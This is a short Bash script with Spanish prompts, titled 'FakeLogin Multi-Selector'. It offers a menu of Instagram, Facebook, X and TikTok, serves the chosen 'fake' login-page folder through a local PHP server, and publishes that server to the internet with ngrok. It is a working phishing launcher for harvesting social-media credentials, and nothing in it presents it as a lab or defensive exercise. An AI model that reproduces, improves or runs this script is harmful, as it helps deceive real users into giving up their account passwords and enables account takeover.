#!/bin/bash

clear
echo "=== FakeLogin Multi-Selector ==="
echo "1) Instagram"
echo "2) Facebook"
echo "3) X (Twitter)"
echo "4) TikTok"
echo "0) Salir"
read -p "Elige una opción: " option

kill_processes() {
  pkill -f "php -S 127.0.0.1:8080" 2>/dev/null
  pkill -f "./ngrok http 8080" 2>/dev/null
}

start_server () {
  local folder=$1

  # Verifica si la carpeta existe
  if [ ! -d "$folder" ]; then
    echo "[!] La carpeta '$folder' no existe. Verifica la estructura del repositorio."
    exit 1
  fi

  # Verifica si ngrok existe
  if [ ! -f "./ngrok" ]; then
    echo "[!] No se encontró ngrok en la raíz. Descárgalo antes de continuar."
    exit 1
  fi

  kill_processes

  echo "[*] Iniciando servidor PHP en 127.0.0.1:8080"
  php -S 127.0.0.1:8080 -t "$folder" > /dev/null 2>&1 &
  sleep 2
  echo "[*] Iniciando ngrok..."
  ./ngrok http 8080
}

case $option in
  1) start_server "instagram/fake-instagram" ;;
  2) start_server "facebook/fake-facebook" ;;
  3) start_server "x-twitter/fake-x-twitter" ;;
  4) start_server "tiktok/fake-tiktok" ;;
  0) echo "Saliendo..."; exit 0 ;;
  *) echo "Opción inválida"; exit 1 ;;
esac